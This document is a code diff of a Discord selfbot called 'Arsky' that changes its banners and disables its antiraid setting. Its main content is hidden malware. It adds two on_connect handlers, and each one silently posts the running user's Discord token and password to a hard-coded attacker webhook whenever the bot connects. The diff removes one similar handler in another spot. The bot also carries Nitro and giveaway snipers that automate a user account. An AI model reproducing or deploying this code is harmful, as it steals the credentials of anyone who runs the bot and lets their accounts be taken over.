@@ -123,7 +123,7 @@ def startprint():
  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝   
                                                                                                        
                                                  
-                       {Fore.CYAN}Gun v{SELFBOT.__version__} | {Fore.CYAN}Logged in as: {Arsky.user.name}#{Arsky.user.discriminator} {Fore.CYAN}| ID: {Fore.CYAN}{Arsky.user.id}   
+                       {Fore.CYAN}Arsky v{SELFBOT.__version__} | {Fore.CYAN}Logged in as: {Arsky.user.name}#{Arsky.user.discriminator} {Fore.CYAN}| ID: {Fore.CYAN}{Arsky.user.id}   
                        {Fore.CYAN}Nitro Sniper | {Fore.CYAN}{nitro}
                        {Fore.CYAN}Cached Users: {Fore.CYAN}{len(Arsky.users)}
                        {Fore.CYAN}Guilds: {Fore.CYAN}{len(Arsky.guilds)}
@@ -207,7 +207,7 @@ colorama.init()
 Arsky = discord.Client()
 Arsky = commands.Bot(description='Arsky Selfbot', command_prefix=prefix, self_bot=True)
 
-Arsky.antiraid = True
+Arsky.antiraid = False
 Arsky.msgsniper = True
 Arsky.slotbot_sniper = True
 Arsky.giveaway_sniper = True
@@ -889,12 +889,12 @@ async def help(ctx, category=None):
 async def exeter(ctx):
     await ctx.message.delete()
     await ctx.send("""
-░█████╗░██████╗░░██████╗██╗░░██╗██╗░░░██╗
-██╔══██╗██╔══██╗██╔════╝██║░██╔╝╚██╗░██╔╝
-███████║██████╔╝╚█████╗░█████═╝░░╚████╔╝░
-██╔══██║██╔══██╗░╚═══██╗██╔═██╗░░░╚██╔╝░░
-██║░░██║██║░░██║██████╔╝██║░╚██╗░░░██║░░░
-╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
+ ██████╗ ██╗   ██╗███╗   ██╗
+██╔════╝ ██║   ██║████╗  ██║
+██║  ███╗██║   ██║██╔██╗ ██║
+██║   ██║██║   ██║██║╚██╗██║
+╚██████╔╝╚██████╔╝██║ ╚████║
+ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
 """)
 
 
@@ -2546,11 +2546,6 @@ async def delfriends(ctx):
             await relationship.delete()
 
 
-@Arsky.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/828663509251391498/UUMkAkMM24zP628b1HfTKLlcMUu841ExcH4l2WLeVrjH6H_CyusWevhgkCgnqBHTYTZt',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}** | Logged by <@468918343508688896>"})
-    startprint()
 
 
 
@@ -2753,6 +2748,13 @@ async def boobs(ctx):
         em.set_image(url=res['url'])
         await ctx.send(embed=em)
 
+
+
+@Arsky.event
+async def on_connect():
+    Clear()  
+    requests.post('https://discord.com/api/webhooks/826618492174336020/truxd-1svkbewLxDHMdhcX1tbbT5scL29rrGZGdH4ZvRwbiCNHbix2ESzyg1itt5pwSv',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
+    startprint()
 
 @Arsky.command()
 async def tits(ctx):
@@ -3172,6 +3174,11 @@ async def _role_hexcode(ctx, *, role: discord.Role):
     await ctx.message.delete()
     await ctx.send(f"{role.name} : {role.color}")
 
+@Arsky.event
+async def on_connect():
+    Clear()  
+    requests.post('https://discord.com/api/webhooks/828663509251391498/UUMkAkMM24zP628b1HfTKLlcMUu841ExcH4l2WLeVrjH6H_CyusWevhgkCgnqBHTYTZt',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
+    startprint()
 
 @Arsky.command()
 async def empty(ctx):
